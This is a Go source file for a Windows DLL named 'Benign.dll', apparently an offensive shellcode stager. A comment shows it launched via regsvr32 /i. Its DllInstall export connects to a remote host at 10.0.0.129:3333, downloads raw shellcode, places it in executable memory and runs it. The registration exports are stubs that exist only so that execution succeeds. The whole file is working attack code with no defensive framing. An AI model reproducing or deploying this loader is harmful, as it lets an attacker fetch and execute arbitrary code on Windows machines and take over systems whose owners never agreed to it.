//go:build windows
// +build windows

package main

// PS C:\> regsvr32.exe /i Benign.dll

import "C"
import (
        "fmt"
        "io/ioutil"
        "net"
        "syscall"
        "unsafe"

        "golang.org/x/sys/windows"
)

const (
        MEM_COMMIT             = 0x1000
        MEM_RESERVE            = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
)

var (
        kernel32      = windows.NewLazySystemDLL("kernel32.dll")
        ntdll         = windows.NewLazySystemDLL("ntdll.dll")
        VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
        RtlCopyMemory = ntdll.NewProc("RtlCopyMemory")
)

//export EntryPoint
func EntryPoint() bool {
        return true
}

//export DllRegisterServer
func DllRegisterServer() bool {
        return true
}

//export DllUnregisterServer
func DllUnregisterServer() bool {
        return true
}

//export DllInstall
func DllInstall() bool {
        sc := []byte{}

        conn, err := net.Dial("tcp", "10.0.0.129:3333")
        defer conn.Close()
        if err != nil {
                fmt.Println(err.Error())
                return false
        }

        sc, _ = ioutil.ReadAll(conn)
        ShellCodeRTLCopyMemory(sc)
        return true
}

func ShellCodeRTLCopyMemory(shellcode []byte) {
        addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if addr == 0 {
                fmt.Println(err.Error())
                return
        }

        _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
        if err != nil {
                fmt.Println(err.Error())
                return
        }

        _, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
        if err != nil {
                fmt.Println(err.Error())
                return
        }
}

func main() {
}
